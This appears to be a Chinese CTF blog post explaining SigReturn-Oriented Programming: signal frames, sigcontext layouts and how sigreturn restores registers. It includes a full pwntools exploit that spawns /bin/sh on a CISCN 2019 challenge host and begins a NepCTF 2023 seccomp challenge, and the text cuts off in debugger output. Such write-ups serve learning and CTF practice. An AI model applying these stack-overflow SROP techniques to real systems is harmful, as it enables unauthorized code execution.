<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>初探srop | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>初探srop</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-12T23:25:04.000Z" id="date"> 2023-08-12</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-16T06:35:43.094Z" id="updated"> 2023-08-16</time></div></span></div></div><hr><div id="post-content"><p>signal 机制<br>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(str1d3r㉿str1k3Gwindows)-[~]<br>└─$ <span class="hljs-built_in">kill</span> -l<br> 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP<br> 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1<br>11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM<br>16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP<br>21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ<br>26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR<br>31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3<br>38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8<br>43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13<br>48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12<br>53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7<br>58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2<br>63) SIGRTMAX-1  64) SIGRTMAX<br></code></pre></td></tr></table></figure>
<p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p>
<p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<br>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext<br>x86</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure>
<p>x64</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure>
<p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p>
<p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>
<p>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。<br>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。<br>说到这里，其实，SROP 的基本利用原理也就出现了。<br>获取 shell<br>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。<br>system call chains<br>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可控制栈指针。把原来 rip 指向的syscall gadget 换成syscall; ret gadget。这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。<br>后续 ¶<br>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件<br>可以通过栈溢出来控制栈的内容<br>需要知道相应的地址<br>“&#x2F;bin&#x2F;sh”<br>Signal Frame<br>syscall<br>sigreturn<br>需要有够大的空间来塞下整个 sigal frame</p>
<p>以上介绍来自CTFwiki<br>pwntools已集成srop攻击</p>
<p>[CISCN 2019华南]PWN3 #复现环境ubuntu 20.04</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs s">str1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27; <br>[*] &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure>
<p>保护没特别的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> __int64 v0; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v0 = sys_read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x400</span>uLL);<br>  <span class="hljs-keyword">return</span> sys_write(<span class="hljs-number">1u</span>, buf, <span class="hljs-number">0x30</span>uLL); <span class="hljs-comment">//打印出栈地址</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>给了gadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sh">.text:00000000004004D6                               public gadgets<br>.text:00000000004004D6                               gadgets proc near<br>.text:00000000004004D6                               ; __unwind &#123;<br>.text:00000000004004D6 55                            push    rbp<br>.text:00000000004004D7 48 89 E5                      mov     rbp, rsp<br>.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh<br>.text:00000000004004E1 C3                            retn<br>.text:00000000004004E1<br>.text:00000000004004E1                               gadgets endp ; sp-analysis failed<br>.text:00000000004004E1<br>.text:00000000004004E2                               ; ---------------------------------------------------------------------------<br>.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; <span class="hljs-string">&#x27;;&#x27;</span><br>.text:00000000004004E9 C3                            retn<br>.text:00000000004004E9<br>.text:00000000004004E9                               ; ---------------------------------------------------------------------------<br>.text:00000000004004EA 90                            db 90h<br>.text:00000000004004EB                               ; ---------------------------------------------------------------------------<br>.text:00000000004004EB 5D                            pop     rbp<br>.text:00000000004004EC C3                            retn<br>.text:00000000004004EC                               ; &#125; // starts at 4004D6<br></code></pre></td></tr></table></figure>
<p>有mov rax，0xf,显然进行srop<br>要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值bin_sh字符串的地址<br>需要把bin_sh写到栈上 然后利用write函数泄露栈地址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; x/40gx 0x7fffffffe330<br>0x7fffffffe330:	0x6161616161616161*	0x000000000040050a <br>0x7fffffffe340:	0x00007fffffffe360	0x0000000000400536<br>0x7fffffffe350:	0x00007fffffffe458*	0x0000000100000000 <br>0x7fffffffe360:	0x0000000000000000	0x00007ffff7de8083<br>0x7fffffffe370:	0x00007ffff7ffc620	0x00007fffffffe458<br>0x7fffffffe380:	0x0000000100000000	0x000000000040051d<br>0x7fffffffe390:	0x0000000000400540	0xb0a1866950c4d504<br>0x7fffffffe3a0:	0x00000000004003e0	0x00007fffffffe450<br>0x7fffffffe3b0:	0x0000000000000000	0x0000000000000000<br>0x7fffffffe3c0:	0x4f5e79969624d504	0x4f5e69d450aad504<br>0x7fffffffe3d0:	0x0000000000000000	0x0000000000000000<br>0x7fffffffe3e0:	0x0000000000000000	0x0000000000000001<br>0x7fffffffe3f0:	0x00007fffffffe458	0x00007fffffffe468<br>0x7fffffffe400:	0x00007ffff7ffe190	0x0000000000000000<br>0x7fffffffe410:	0x0000000000000000	0x00000000004003e0<br>0x7fffffffe420:	0x00007fffffffe450	0x0000000000000000<br>0x7fffffffe430:	0x0000000000000000	0x0000000000400409<br>0x7fffffffe440:	0x00007fffffffe448	0x000000000000001c<br>0x7fffffffe450:	0x0000000000000001	0x00007fffffffe6d4<br>0x7fffffffe460:	0x0000000000000000	0x00007fffffffe709<br></code></pre></td></tr></table></figure>
<p>输入的8字节的字母a位于0x7fffffffe330,0x7fffffffe350处有一个0x00007fffffffe458的地址可以泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn3&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node1.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28856</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn3&quot;</span>)<br><br>syscall = <span class="hljs-number">0x400501</span><br>syscall_ret = <span class="hljs-number">0x400517</span><br>gadget = <span class="hljs-number">0x4004DA</span><br>vuln = <span class="hljs-number">0x4004ED</span><br><span class="hljs-comment">#泄露栈地址</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(vuln))<br>p.recv(<span class="hljs-number">0x20</span>)<br>stack = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-comment">#srop</span><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = stack<br>frame.rip = syscall<br>frame.rsi = <span class="hljs-number">0</span><br><br>payload = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">0x2</span> + p64(gadget) + p64(syscall) + <span class="hljs-built_in">bytes</span>(frame)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>[NepCTF 2023] -srop  #wp待补充</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x30</span>]=<span class="hljs-string">&quot;welcome to NepCTF2023!\n&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">seccomp</span><span class="hljs-params">()</span>&#123;<br>    scmp_filter_ctx ctx;<br>    ctx = seccomp_init(SCMP_ACT_KILL);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="hljs-number">0</span>);<br>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="hljs-number">0</span>);<br>    seccomp_load(ctx);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//沙盒</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sys</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br>&#125;<span class="hljs-comment">//syscall</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>     <span class="hljs-type">char</span> bd[<span class="hljs-number">0x30</span>];<br>     seccomp();<br>     syscall(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>); <span class="hljs-comment">//write(&quot;welcome to NepCTF2023!\n&quot;)</span><br>     <span class="hljs-keyword">return</span> syscall(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bd,<span class="hljs-number">0x300</span>);  <span class="hljs-comment">//read(bd,0x300)</span><br>&#125;<span class="hljs-comment">//主函数</span><br></code></pre></td></tr></table></figure>
<p>查保护</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; checksec<br>[*] <span class="hljs-string">&#x27;/home/str1k3/Desktop/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">str1k3@ubuntu:~/Desktop$ seccomp-tools dump ./pwn<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="hljs-built_in">arch</span><br> 0001: 0x15 0x00 0x08 0xc000003e  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto 0010<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  <span class="hljs-keyword">if</span> (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x05 0xffffffff  <span class="hljs-keyword">if</span> (A != 0xffffffff) goto 0010<br> 0005: 0x15 0x03 0x00 0x00000000  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">read</span>) goto 0009<br> 0006: 0x15 0x02 0x00 0x00000001  <span class="hljs-keyword">if</span> (A == write) goto 0009<br> 0007: 0x15 0x01 0x00 0x00000002  <span class="hljs-keyword">if</span> (A == open) goto 0009<br> 0008: 0x15 0x00 0x01 0x0000000f  <span class="hljs-keyword">if</span> (A != rt_sigreturn) goto 0010<br> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="hljs-built_in">return</span> ALLOW<br> 0010: 0x06 0x00 0x00 0x00000000  <span class="hljs-built_in">return</span> KILL<br></code></pre></td></tr></table></figure>
<p>沙盒，但是允许了orw</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; search flag<br>Searching <span class="hljs-keyword">for</span> value: <span class="hljs-string">&#x27;flag&#x27;</span><br>libc-2.27.so    0x7ffff77d4a3b insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags&#x27;</span> */<br>libc-2.27.so    0x7ffff77d7505 insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags&#x27;</span> */<br>libc-2.27.so    0x7ffff77d7906 insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags&#x27;</span> */<br>libc-2.27.so    0x7ffff79736a0 insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags&#x27;</span> */<br>libc-2.27.so    0x7ffff7979b44 insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags2 &amp; _IO_FLAGS2_FORTIFY&#x27;</span> */<br>libc-2.27.so    0x7ffff79b0282 <span class="hljs-string">&#x27;flags is not implemented and will always fail&#x27;</span><br>warning: Unable to access 16003 bytes of target memory at 0x7ffff79b0286, halting search.<br>warning: Unable to access 16003 bytes of target memory at 0x7ffff7bd1000, halting search.<br>ld-2.27.so      0x7ffff7df6421 insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flag)&#x27;</span> */<br>ld-2.27.so      0x7ffff7df6efe insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flag value(s) of 0x%x in 